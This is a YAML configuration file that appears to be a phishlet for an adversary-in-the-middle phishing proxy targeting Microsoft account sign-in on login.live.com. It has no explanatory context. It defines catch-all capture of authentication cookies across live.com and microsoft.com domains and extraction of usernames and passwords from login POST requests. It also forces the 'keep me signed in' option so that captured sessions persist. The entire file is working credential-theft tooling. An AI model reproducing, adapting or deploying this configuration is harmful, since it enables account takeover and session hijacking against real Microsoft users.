auth_tokens:
  - domain: '.login.live.com'
    keys: ['MSPOK','.*,regexp']
  - domain: '.live.com'
    keys: ['.*,regexp']
  - domain: '.microsoft.com'
    keys: ['.*,regexp']
  - domain: '.account.microsoft.com'
    keys: ['.*,regexp']      
auth_urls:
  - '/'
  - '/*'  
  - '/auth'
  - '/auth/*'
credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'

force_post:
  - path: '/ppsecure/post.srf'
    search:
      - {key: 'login', search: '.*'}
      - {key: 'passwd', search: '.*'}
    force:
      - {key: 'KMSI', value: 'on'}
    type: 'post'    
login:
  domain: 'login.live.com'
  path: 'login.srf'

